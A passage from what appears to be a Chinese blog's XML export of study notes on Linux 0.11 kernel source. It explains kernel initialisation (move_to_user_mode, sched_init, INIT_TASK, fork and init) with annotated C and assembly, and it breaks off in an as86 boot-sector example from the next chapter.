<h1 id="书籍章节划分"><a href="#书籍章节划分" class="headerlink" title="书籍章节划分"></a>书籍章节划分</h1><p>书籍分为了5个部分,第1章至第4章是基础部分.操作系统与所运行的硬件环境密切相关(Intel的80X86保护模式下的编程原理,据说到目前为止Linus本人仍然认为X86系列的处理器比较适合Linux);<br>第二部分包括第5至第7章,描述内核引导启动和32位运行方式的准备阶段,作为学习内核的初学者应该全部进行阅读;<br>第三部分是从第8章到第13章是内核代码的主要部分;<br>第四部分是从14章到16章,作为第三部分的参考部分;<br>第五部分介绍如何使用PC模拟软件系统Bochs针对Linux 0.11内核进行各种实验活动.  </p>
]]></content>
      <categories>
        <category>study</category>
      </categories>
      <tags>
        <tag>C/C++</tag>
        <tag>Linux kernel</tag>
        <tag>LDD</tag>
        <tag>Asm</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux内核0.11完全注释 第七章</title>
    <url>/embpgp.github.io/2016/12/15/Linux%E5%86%85%E6%A0%B80-11%E5%AE%8C%E5%85%A8%E6%B3%A8%E9%87%8A-%E7%AC%AC%E4%B8%83%E7%AB%A0/</url>
    <content><![CDATA[<blockquote>
<p>init进程来了</p>
</blockquote>
<span id="more"></span>

<hr>
<h1 id="内核初始化流程"><a href="#内核初始化流程" class="headerlink" title="内核初始化流程"></a>内核初始化流程</h1><p><img src="/images/Linux_0.11_chapter7_main_init.png" alt="Linux_0.11_chapter7_main_init.png"></p>
<h1 id="着重分析”move-to-user-mode-”的前前后后"><a href="#着重分析”move-to-user-mode-”的前前后后" class="headerlink" title="着重分析”move_to_user_mode()”的前前后后"></a>着重分析”move_to_user_mode()”的前前后后</h1><h2 id="move-to-user-mode-宏定义"><a href="#move-to-user-mode-宏定义" class="headerlink" title="move_to_user_mode()宏定义"></a>move_to_user_mode()宏定义</h2><ul>
<li>这是一段嵌入汇编，gcc在预处理的时候就会完全替代掉。本质是模拟中断返回从内核态转到用户态，但是控制流还是下面那段。相当于虽然从内核态转到用户态但是由于选择子指向的是同一段物理内存空间，所以CPU执行流看起来还是没有什么”异常”。</li>
<li>根据压栈顺序可以知道用户态cs为0x0f，EIP为iret指令下面的标号1处，功能是仅仅将用户态的局部段选择子值送往各个数据段选择器。而后就会执行fork()函数。下面去看一下任务0的全局描述符表的项是如何加载进去的。<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> move_to_user_mode() \</span></span><br><span class="line"><span class="meta">__asm__ (<span class="meta-string">&quot;movl %%esp,%%eax\n\t&quot;</span> \</span></span><br><span class="line"><span class="meta">	<span class="meta-string">&quot;pushl $0x17\n\t&quot;</span> \</span></span><br><span class="line"><span class="meta">	<span class="meta-string">&quot;pushl %%eax\n\t&quot;</span> \</span></span><br><span class="line"><span class="meta">	<span class="meta-string">&quot;pushfl\n\t&quot;</span> \</span></span><br><span class="line"><span class="meta">	<span class="meta-string">&quot;pushl $0x0f\n\t&quot;</span> \</span></span><br><span class="line"><span class="meta">	<span class="meta-string">&quot;pushl $1f\n\t&quot;</span> \</span></span><br><span class="line"><span class="meta">	<span class="meta-string">&quot;iret\n&quot;</span> \</span></span><br><span class="line"><span class="meta">	<span class="meta-string">&quot;1:\tmovl $0x17,%%eax\n\t&quot;</span> \</span></span><br><span class="line"><span class="meta">	<span class="meta-string">&quot;movw %%ax,%%ds\n\t&quot;</span> \</span></span><br><span class="line"><span class="meta">	<span class="meta-string">&quot;movw %%ax,%%es\n\t&quot;</span> \</span></span><br><span class="line"><span class="meta">	<span class="meta-string">&quot;movw %%ax,%%fs\n\t&quot;</span> \</span></span><br><span class="line"><span class="meta">	<span class="meta-string">&quot;movw %%ax,%%gs&quot;</span> \</span></span><br><span class="line"><span class="meta">	:::<span class="meta-string">&quot;ax&quot;</span>)</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="sched-init"><a href="#sched-init" class="headerlink" title="sched_init()"></a>sched_init()</h2><ul>
<li>我们根据已有的注释可以大概知道这个函数的功能，主要进行了任务0的tss和ldt的加载到GDT中,以及把剩余任务的tss和ldt槽清0。</li>
<li>清除掉NT标志，因为并没有任务嵌套并且tss的back_link字段无效。</li>
<li>由于是第一次，因此必须手动加载tss到tr以及ldt到ldtr。</li>
<li>定时器功能选择，用于定时任务切换调度。</li>
<li>加载定时器中断门和系统调用门0x80到gdt。<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 内核调度程序的初始化子程序</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sched_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> * <span class="title">p</span>;</span>                 <span class="comment">// 描述符表结构指针</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Linux系统开发之初，内核不成熟。内核代码会被经常修改。Linus怕自己无意中修改了</span></span><br><span class="line">    <span class="comment">// 这些关键性的数据结构，造成与POSIX标准的不兼容。这里加入下面这个判断语句并无</span></span><br><span class="line">    <span class="comment">// 必要，纯粹是为了提醒自己以及其他修改内核代码的人。</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">sizeof</span>(struct sigaction) != <span class="number">16</span>)         <span class="comment">// sigaction 是存放有关信号状态的结构</span></span><br><span class="line">		panic(<span class="string">&quot;Struct sigaction MUST be 16 bytes&quot;</span>);</span><br><span class="line">    <span class="comment">// 在全局描述符表中设置初始任务(任务0)的任务状态段描述符和局部数据表描述符。</span></span><br><span class="line">    <span class="comment">// FIRST_TSS_ENTRY和FIRST_LDT_ENTRY的值分别是4和5，定义在include/linux/sched.h</span></span><br><span class="line">    <span class="comment">// 中；gdt是一个描述符表数组(include/linux/head.h)，实际上对应程序head.s中</span></span><br><span class="line">    <span class="comment">// 全局描述符表基址（_gdt）.因此gtd+FIRST_TSS_ENTRY即为gdt[FIRST_TSS_ENTRY](即为gdt[4]),</span></span><br><span class="line">    <span class="comment">// 也即gdt数组第4项的地址。</span></span><br><span class="line">	set_tss_desc(gdt+FIRST_TSS_ENTRY,&amp;(init_task.task.tss));</span><br><span class="line">	set_ldt_desc(gdt+FIRST_LDT_ENTRY,&amp;(init_task.task.ldt));</span><br><span class="line">    <span class="comment">// 清任务数组和描述符表项(注意 i=1 开始，所以初始任务的描述符还在)。描述符项结构</span></span><br><span class="line">    <span class="comment">// 定义在文件include/linux/head.h中。</span></span><br><span class="line">	p = gdt+<span class="number">2</span>+FIRST_TSS_ENTRY;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;NR_TASKS;i++) &#123;</span><br><span class="line">		task[i] = <span class="literal">NULL</span>;</span><br><span class="line">		p-&gt;a=p-&gt;b=<span class="number">0</span>;</span><br><span class="line">		p++;</span><br><span class="line">		p-&gt;a=p-&gt;b=<span class="number">0</span>;</span><br><span class="line">		p++;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="comment">/* Clear NT, so that we won&#x27;t have troubles with that later on */</span></span><br><span class="line">    <span class="comment">// NT标志用于控制程序的递归调用(Nested Task)。当NT置位时，那么当前中断任务执行</span></span><br><span class="line">    <span class="comment">// iret指令时就会引起任务切换。NT指出TSS中的back_link字段是否有效。</span></span><br><span class="line">	__asm__(<span class="string">&quot;pushfl ; andl $0xffffbfff,(%esp) ; popfl&quot;</span>);        <span class="comment">// 复位NT标志</span></span><br><span class="line">	ltr(<span class="number">0</span>);</span><br><span class="line">	lldt(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">// 下面代码用于初始化8253定时器。通道0，选择工作方式3，二进制计数方式。通道0的</span></span><br><span class="line">    <span class="comment">// 输出引脚接在中断控制主芯片的IRQ0上，它每10毫秒发出一个IRQ0请求。LATCH是初始</span></span><br><span class="line">    <span class="comment">// 定时计数值。</span></span><br><span class="line">	outb_p(<span class="number">0x36</span>,<span class="number">0x43</span>);		<span class="comment">/* binary, mode 3, LSB/MSB, ch 0 */</span></span><br><span class="line">	outb_p(LATCH &amp; <span class="number">0xff</span> , <span class="number">0x40</span>);	<span class="comment">/* LSB */</span></span><br><span class="line">	outb(LATCH &gt;&gt; <span class="number">8</span> , <span class="number">0x40</span>);	<span class="comment">/* MSB */</span></span><br><span class="line">    <span class="comment">// 设置时钟中断处理程序句柄(设置时钟中断门)。修改中断控制器屏蔽码，允许时钟中断。</span></span><br><span class="line">    <span class="comment">// 然后设置系统调用中断门。这两个设置中断描述符表IDT中描述符在宏定义在文件</span></span><br><span class="line">    <span class="comment">// include/asm/system.h中。</span></span><br><span class="line">	set_intr_gate(<span class="number">0x20</span>,&amp;timer_interrupt);</span><br><span class="line">	outb(inb_p(<span class="number">0x21</span>)&amp;~<span class="number">0x01</span>,<span class="number">0x21</span>);</span><br><span class="line">	set_system_gate(<span class="number">0x80</span>,&amp;system_call);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="init-task共同体"><a href="#init-task共同体" class="headerlink" title="init_task共同体"></a>init_task共同体</h2><ul>
<li>关于内核态的堆栈”只读”理解见<a href="https://github.com/embpgp/Linux_kernel_0.11_examples/blob/master/chapter4/example_for_multi_tasks/head.s#L180">这里</a></li>
<li>注释里面也提到了，task_struct结构体和内核态堆栈都处于同一个页面，因此把两者放在一起构成一个共同体是很正确的用法。<del>但得保证task结构体必须放在4K对齐边界，否则在初始化的时候加了个PAGE_SIZE esp0就指到了另外一个内存页了。</del>经过调试发现任务0并不需要满足4K对齐条件，编译的时候也没有特意要求init_task共同体放在边界，但只要不影响程序执行就没什么特别对待的。但后面经过fork()的任务通过层次调用get_page()返回的地址就是4K对齐了。<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(gdb) info registers </span><br><span class="line">eax            0x0	0</span><br><span class="line">ecx            0x55e8	21992</span><br><span class="line">edx            0x17	23</span><br><span class="line">ebx            0x3	3</span><br><span class="line">esp            0x1f0ec	0x1f0ec &lt;init_task+4012&gt;</span><br><span class="line">ebp            0x24e88	0x24e88 &lt;user_stack+4072&gt;</span><br><span class="line">esi            0xe0000	917504</span><br><span class="line">edi            0xffc	4092</span><br><span class="line">eip            0x6d4c	0x6d4c &lt;schedule+163&gt;</span><br><span class="line">eflags         0x246	[ PF ZF IF ]</span><br><span class="line">cs             0x8	8</span><br><span class="line">ss             0x10	16</span><br><span class="line">ds             0x10	16</span><br><span class="line">es             0x10	16</span><br><span class="line">fs             0x17	23</span><br><span class="line">gs             0x17	23</span><br><span class="line">(gdb) <span class="built_in">print</span> &amp;init_task</span><br><span class="line"><span class="variable">$1</span> = (union task_union *) 0x1e140 &lt;init_task&gt;</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 每个任务(进程)在内核态运行时都有自己的内核态堆栈。这里定义了任务的内核态堆栈结构。</span></span><br><span class="line"><span class="comment">// 定义任务联合(任务结构成员和stack字符数组成员)。因为一个任务的数据结构与其内核态堆栈</span></span><br><span class="line"><span class="comment">// 在同一内存页中，所以从堆栈段寄存器ss可以获得其数据端选择符。</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">task_union</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> <span class="title">task</span>;</span></span><br><span class="line">	<span class="keyword">char</span> <span class="built_in">stack</span>[PAGE_SIZE];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">union</span> <span class="title">task_union</span> <span class="title">init_task</span> =</span> &#123;INIT_TASK,&#125;;   <span class="comment">// 定义初始任务的数据</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="INIT-TASK宏"><a href="#INIT-TASK宏" class="headerlink" title="INIT_TASK宏"></a>INIT_TASK宏</h2><ul>
<li>越过前面的任务字段看后面的tss字段可以看到ss0为0x10,esp0为PAGE_SIZE+init_task。</li>
<li>CR3字段为<a href="https://github.com/embpgp/linux-0.11-lab/blob/master/boot/head.s#L16">pg_dir</a>,其实就是物理地址为0x00000000处，代码运行到<a href="https://github.com/embpgp/linux-0.11-lab/blob/master/boot/head.s#L128">0x5000</a>之后就开始”粉碎”物理地址0x0000处的代码和数据了。重新建立新的”秩序”,一个页目录和4个页表。参见<a href="https://github.com/embpgp/linux-0.11-lab/blob/master/boot/head.s#L137">after_page_tables</a>和<a href="https://github.com/embpgp/linux-0.11-lab/blob/master/boot/head.s#L200">setup_paging</a>这两个汇编过程源码。</li>
<li>其余字段几乎初始化为默认值(0)。而esp3是由move_to_user_mode()宏来加载的。</li>
<li>局部段的代码段和数据段的物理地址还是对应内核一致。<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *  INIT_TASK is used to set up the first task table, touch at</span></span><br><span class="line"><span class="comment"> * your own risk!. Base=0, limit=0x9ffff (=640kB)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INIT_TASK \</span></span><br><span class="line"><span class="meta"><span class="comment">/* state etc */</span>	&#123; 0,15,15, \</span></span><br><span class="line"><span class="meta"><span class="comment">/* signals */</span>	0,&#123;&#123;&#125;,&#125;,0, \</span></span><br><span class="line"><span class="meta"><span class="comment">/* ec,brk... */</span>	0,0,0,0,0,0, \</span></span><br><span class="line"><span class="meta"><span class="comment">/* pid etc.. */</span>	0,-1,0,0,0, \</span></span><br><span class="line"><span class="meta"><span class="comment">/* uid etc */</span>	0,0,0,0,0,0, \</span></span><br><span class="line"><span class="meta"><span class="comment">/* alarm */</span>	0,0,0,0,0,0, \</span></span><br><span class="line"><span class="meta"><span class="comment">/* math */</span>	0, \</span></span><br><span class="line"><span class="meta"><span class="comment">/* fs info */</span>	-1,0022,NULL,NULL,NULL,0, \</span></span><br><span class="line"><span class="meta"><span class="comment">/* filp */</span>	&#123;NULL,&#125;, \</span></span><br><span class="line"><span class="meta">	&#123; \</span></span><br><span class="line"><span class="meta">		&#123;0,0&#125;, \</span></span><br><span class="line"><span class="meta"><span class="comment">/* ldt */</span>	&#123;0x9f,0xc0fa00&#125;, \</span></span><br><span class="line"><span class="meta">		&#123;0x9f,0xc0f200&#125;, \</span></span><br><span class="line"><span class="meta">	&#125;, \</span></span><br><span class="line"><span class="meta"><span class="comment">/*tss*/</span>	&#123;0,PAGE_SIZE+(long)&amp;init_task,0x10,0,0,0,0,(long)&amp;pg_dir,\</span></span><br><span class="line"><span class="meta">	 0,0,0,0,0,0,0,0, \</span></span><br><span class="line"><span class="meta">	 0,0,0x17,0x17,0x17,0x17,0x17,0x17, \</span></span><br><span class="line"><span class="meta">	 _LDT(0),0x80000000, \</span></span><br><span class="line"><span class="meta">		&#123;&#125; \</span></span><br><span class="line"><span class="meta">	&#125;, \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
<blockquote>
<p>此时已经从内核态返回到了任务0的用户态了，但是控制流已经执行到了fork()函数了，Linux 0.11由一个宏定义来引用，下面继续分析</p>
</blockquote>
<h2 id="fork"><a href="#fork" class="headerlink" title="fork"></a>fork</h2><ul>
<li>为了不”污染”任务1的用户栈因此选择使用宏定义来进行fork系统调用。<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Linux在内核空间创建进程时不使用写时复制技术(Copy on write).main()在移动到用户</span></span><br><span class="line"><span class="comment">// 模式（到任务0）后执行内嵌方式的fork()和pause(),因此可保证不适用任务0的用户栈。</span></span><br><span class="line"><span class="comment">// 在执行moveto_user_mode()之后，本程序main()就以任务0的身份在运行了。而任务0是</span></span><br><span class="line"><span class="comment">// 所有将将创建子进程的父进程。当它创建一个子进程时(init进程)，由于任务1代码属于</span></span><br><span class="line"><span class="comment">// 内核空间，因此没有使用写时复制功能。此时任务0的用户栈就是任务1的用户栈，即它们</span></span><br><span class="line"><span class="comment">// 共同使用一个栈空间。因此希望在main.c运行在任务0的环境下不要有对堆栈的任何操作，</span></span><br><span class="line"><span class="comment">// 以免弄乱堆栈。而在再次执行fork()并执行过execve()函数后，被加载程序已不属于内核空间</span></span><br><span class="line"><span class="comment">// 因此可以使用写时复制技术了。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// 下面_syscall0()是unistd.h中的内嵌宏代码。以嵌入汇编的形式调用Linux的系统调用中断</span></span><br><span class="line"><span class="comment">// 0x80.该中断是所有系统调用的入口。该条语句实际上是int fork()创建进程系统调用。可展</span></span><br><span class="line"><span class="comment">// 开看之就会立刻明白。syscall0名称中最后的0表示无参数，1表示1个参数。</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> _syscall0(<span class="keyword">int</span>,fork)</span><br><span class="line"><span class="comment">// int pause() 系统调用，暂停进程的执行，直到收到一个信号</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> _syscall0(<span class="keyword">int</span>,pause)</span><br><span class="line"><span class="comment">// int setup(void * BIOS)系统调用，仅用于linux初始化(仅在这个程序中被调用)</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> _syscall1(<span class="keyword">int</span>,setup,<span class="keyword">void</span> *,BIOS)</span><br><span class="line"><span class="comment">// int sync()系统调用：更新文件系统。</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> _syscall0(<span class="keyword">int</span>,sync)</span><br></pre></td></tr></table></figure></li>
<li>可以直接跳到kernel/system_call.s的<a href="https://github.com/embpgp/linux-0.11-lab/blob/master/kernel/system_call.s#L208">sys_fork</a>系统调用源码处查看。</li>
<li>可以知道主要进行了两个步骤。</li>
<li>find_empty_process:寻找空闲进程号码(个人觉得代码有点”累赘”)</li>
<li>copy_process:复制进程PCB,并修改某些字段以符合逻辑。关于其具体实现等到mm模块的时候再具体分析。最后在父进程中返回last_pid。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">### sys_fork()调用，用于创建子进程，是system_call功能<span class="number">2.</span></span><br><span class="line"># 首先调用C函数find_empty_process()，取得一个进程号PID。若返回负数则说明目前任务数组</span><br><span class="line"># 已满。然后调用copy_process()复制进程。</span><br><span class="line">.align <span class="number">2</span></span><br><span class="line">sys_fork:</span><br><span class="line">	call find_empty_process</span><br><span class="line">	testl %eax,%eax             # 在eax中返回进程号pid。若返回负数则退出。</span><br><span class="line">	js <span class="number">1f</span></span><br><span class="line">	push %gs</span><br><span class="line">	pushl %esi</span><br><span class="line">	pushl %edi</span><br><span class="line">	pushl %ebp</span><br><span class="line">	pushl %eax</span><br><span class="line">	call copy_process</span><br><span class="line">	addl $<span class="number">20</span>,%esp               # 丢弃这里所有压栈内容。</span><br><span class="line"><span class="number">1</span>:	ret</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>之后main函数(即任务0)就一直死循环执行pause()系统调用。</li>
<li>而fork得到的子进程会调用init()函数并继续执行后期初始化。再之后的fork以及execve才调用shell。</li>
<li>并且再之后的while(1)循环会一直执行fork &amp; execve。这也是为什么在shell终端键入exit或者退出命令后显示一个进程号并仍然存在shell的原因。<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 在main()中已经进行了系统初始化，包括内存管理、各种硬件设备和驱动程序。init()函数</span></span><br><span class="line"><span class="comment">// 运行在任务0第1次创建的子进程(任务1)中。它首先对第一个将要执行的程序(shell)的环境</span></span><br><span class="line"><span class="comment">// 进行初始化，然后以登录shell方式加载该程序并执行。</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> pid,i;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// setup()是一个系统调用。用于读取硬盘参数包括分区表信息并加载虚拟盘(若存在的话)</span></span><br><span class="line">    <span class="comment">// 和安装根文件系统设备。该函数用25行上的宏定义，对应函数是sys_setup()，在块设备</span></span><br><span class="line">    <span class="comment">// 子目录kernel/blk_drv/hd.c中。</span></span><br><span class="line">	setup((<span class="keyword">void</span> *) &amp;drive_info);        <span class="comment">// drive_info结构是2个硬盘参数表</span></span><br><span class="line">    <span class="comment">// 下面以读写访问方式打开设备&quot;/dev/tty0&quot;,它对应终端控制台。由于这是第一次打开文件</span></span><br><span class="line">    <span class="comment">// 操作，因此产生的文件句柄号(文件描述符)肯定是0。该句柄是UNIX类操作系统默认的</span></span><br><span class="line">    <span class="comment">// 控制台标准输入句柄stdin。这里再把它以读和写的方式别人打开是为了复制产生标准输出(写)</span></span><br><span class="line">    <span class="comment">// 句柄stdout和标准出错输出句柄stderr。函数前面的&quot;(void)&quot;前缀用于表示强制函数无需返回值。</span></span><br><span class="line">	(<span class="keyword">void</span>) open(<span class="string">&quot;/dev/tty0&quot;</span>,O_RDWR,<span class="number">0</span>);</span><br><span class="line">	(<span class="keyword">void</span>) dup(<span class="number">0</span>);                      <span class="comment">// 复制句柄，产生句柄1号——stdout标准输出设备</span></span><br><span class="line">	(<span class="keyword">void</span>) dup(<span class="number">0</span>);                      <span class="comment">// 复制句柄，产生句柄2号——stderr标准出错输出设备</span></span><br><span class="line">    <span class="comment">// 打印缓冲区块数和总字节数，每块1024字节，以及主内存区空闲内存字节数</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d buffers = %d bytes buffer space\n\r&quot;</span>,NR_BUFFERS,</span><br><span class="line">		NR_BUFFERS*BLOCK_SIZE);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Free mem: %d bytes\n\r&quot;</span>,memory_end-main_memory_start);</span><br><span class="line">    <span class="comment">// 下面fork()用于创建一个子进程(任务2)。对于被创建的子进程，fork()将返回0值，对于</span></span><br><span class="line">    <span class="comment">// 原进程(父进程)则返回子进程的进程号pid。该子进程关闭了句柄0(stdin)、以只读方式打开</span></span><br><span class="line">    <span class="comment">// /etc/rc文件，并使用execve()函数将进程自身替换成/bin/sh程序(即shell程序)，然后</span></span><br><span class="line">    <span class="comment">// 执行/bin/sh程序。然后执行/bin/sh程序。所携带的参数和环境变量分别由argv_rc和envp_rc</span></span><br><span class="line">    <span class="comment">// 数组给出。关闭句柄0并立即打开/etc/rc文件的作用是把标准输入stdin重定向到/etc/rc文件。</span></span><br><span class="line">    <span class="comment">// 这样shell程序/bin/sh就可以运行rc文件中的命令。由于这里的sh的运行方式是非交互的，</span></span><br><span class="line">    <span class="comment">// 因此在执行完rc命令后就会立刻退出，进程2也随之结束。</span></span><br><span class="line">    <span class="comment">// _exit()退出时出错码1 - 操作未许可；2 - 文件或目录不存在。</span></span><br><span class="line">	<span class="keyword">if</span> (!(pid=fork())) &#123;</span><br><span class="line">		close(<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span> (open(<span class="string">&quot;/etc/rc&quot;</span>,O_RDONLY,<span class="number">0</span>))</span><br><span class="line">			_exit(<span class="number">1</span>);                       <span class="comment">// 如果打开文件失败，则退出(lib/_exit.c)</span></span><br><span class="line">		execve(<span class="string">&quot;/bin/sh&quot;</span>,argv_rc,envp_rc);  <span class="comment">// 替换成/bin/sh程序并执行</span></span><br><span class="line">		_exit(<span class="number">2</span>);                           <span class="comment">// 若execve()执行失败则退出。</span></span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">// 下面还是父进程(1)执行语句。wait()等待子进程停止或终止，返回值应是子进程的进程号(pid).</span></span><br><span class="line">    <span class="comment">// 这三句的作用是父进程等待子进程的结束。&amp;i是存放返回状态信息的位置。如果wait()返回值</span></span><br><span class="line">    <span class="comment">// 不等于子进程号，则继续等待。</span></span><br><span class="line">	<span class="keyword">if</span> (pid&gt;<span class="number">0</span>)</span><br><span class="line">		<span class="keyword">while</span> (pid != wait(&amp;i))</span><br><span class="line">			<span class="comment">/* nothing */</span>;</span><br><span class="line">    <span class="comment">// 如果执行到这里，说明刚创建的子进程的执行已停止或终止了。下面循环中首先再创建</span></span><br><span class="line">    <span class="comment">// 一个子进程，如果出错，则显示“初始化程序创建子进程失败”信息并继续执行。对于所</span></span><br><span class="line">    <span class="comment">// 创建的子进程将关闭所有以前还遗留的句柄(stdin, stdout, stderr),新创建一个会话</span></span><br><span class="line">    <span class="comment">// 并设置进程组号，然后重新打开/dev/tty0作为stdin,并复制成stdout和sdterr.再次</span></span><br><span class="line">    <span class="comment">// 执行系统解释程序/bin/sh。但这次执行所选用的参数和环境数组另选了一套。然后父</span></span><br><span class="line">    <span class="comment">// 进程再次运行wait()等待。如果子进程又停止了执行，则在标准输出上显示出错信息</span></span><br><span class="line">    <span class="comment">// “子进程pid挺直了运行，返回码是i”,然后继续重试下去....，形成一个“大”循环。</span></span><br><span class="line">    <span class="comment">// 此外，wait()的另外一个功能是处理孤儿进程。如果一个进程的父进程先终止了，那么</span></span><br><span class="line">    <span class="comment">// 这个进程的父进程就会被设置为这里的init进程(进程1)，并由init进程负责释放一个</span></span><br><span class="line">    <span class="comment">// 已终止进程的任务数据结构等资源。</span></span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> ((pid=fork())&lt;<span class="number">0</span>) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Fork failed in init\r\n&quot;</span>);</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (!pid) &#123;                                 <span class="comment">// 新的子进程</span></span><br><span class="line">			close(<span class="number">0</span>);close(<span class="number">1</span>);close(<span class="number">2</span>);</span><br><span class="line">			setsid();                               <span class="comment">// 创建一新的会话期</span></span><br><span class="line">			(<span class="keyword">void</span>) open(<span class="string">&quot;/dev/tty0&quot;</span>,O_RDWR,<span class="number">0</span>);</span><br><span class="line">			(<span class="keyword">void</span>) dup(<span class="number">0</span>);</span><br><span class="line">			(<span class="keyword">void</span>) dup(<span class="number">0</span>);</span><br><span class="line">			_exit(execve(<span class="string">&quot;/bin/sh&quot;</span>,argv,envp));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">			<span class="keyword">if</span> (pid == wait(&amp;i))</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n\rchild %d died with code %04x\n\r&quot;</span>,pid,i);</span><br><span class="line">		sync();                                     <span class="comment">// 同步操作，刷新缓冲区。</span></span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">// _exit()和exit()都用于正常终止一个函数。但_exit()直接是一个sys_exit系统调用，</span></span><br><span class="line">    <span class="comment">// 而exit()则通常是普通函数库中的一个函数。它会先执行一些清除操作，例如调用</span></span><br><span class="line">    <span class="comment">// 执行各终止处理程序、关闭所有标准IO等，然后调用sys_exit。</span></span><br><span class="line">	_exit(<span class="number">0</span>);	<span class="comment">/* NOTE! _exit, not exit() */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>此时Linux 0.11内核已经起来了，当然还有一大波驱动代码和系统调用、库函数、文件系统(重点)和调度策略等等等没有分析，后面将挑出个人认为重点的部分记录。</p>
]]></content>
      <categories>
        <category>study</category>
      </categories>
      <tags>
        <tag>C/C++</tag>
        <tag>Linux kernel</tag>
        <tag>LDD</tag>
        <tag>Asm</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux内核0.11完全注释 第三章</title>
    <url>/embpgp.github.io/2016/11/15/Linux%E5%86%85%E6%A0%B80-11%E5%AE%8C%E5%85%A8%E6%B3%A8%E9%87%8A-%E7%AC%AC%E4%B8%89%E7%AB%A0/</url>
    <content><![CDATA[<blockquote>
<p>介绍Linux内核0.11版本的编程语言和环境以及目标文件格式等  </p>
</blockquote>
<span id="more"></span>

<hr>
<h1 id="as86-和-ld86"><a href="#as86-和-ld86" class="headerlink" title="as86 和 ld86"></a>as86 和 ld86</h1><ul>
<li><p>as86 在开发Linux内核时仅用来创建16位的启动引导扇区程序boot/boosect.s和实模式下的初始设置程序boot/setup.s的二进制执行代码.采用Intel格式的汇编指令格式.</p>
</li>
<li><p>汇编的命令行基本格式:<code>as [选项] -o objfile srcfile</code>.</p>
</li>
<li><p><code>=</code>或<code>EQU</code>符号等价于C语言的宏</p>
</li>
<li><p><code>.</code>编译过程中的位置计数器,等价于<code>$</code></p>
</li>
<li><p><code>:</code>符号,本质为汇编地址</p>
</li>
<li><p>目标文件objfile起码包含三个section,<strong>.text</strong>,<strong>.data</strong>,<strong>.bss</strong></p>
</li>
<li><p>as86汇编语言程序例程:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!</span><br><span class="line">!Filename:boot.s</span><br><span class="line">!</span><br><span class="line">!Description: boot section codes on Intel CPU</span><br><span class="line">!</span><br><span class="line">!Author:rutk1t0r</span><br><span class="line">!</span><br><span class="line">!Data:2016.11.8</span><br><span class="line">!</span><br><span class="line">!GPL</span><br><span class="line">!</span><br><span class="line">!method:</span><br><span class="line">![/root]# as86 -0 -a -o boot.o boot.s    #编译</span><br><span class="line">![/root]# ld86 -0 -s -o boot boot.o      #链接</span><br><span class="line">![/root]# dd bs=32 if=boot of=/dev/fd0 skip=1   #写入软盘或者image文件,跳过文件头</span><br><span class="line">!==================================================================</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">! boot.s -- bootsect.s 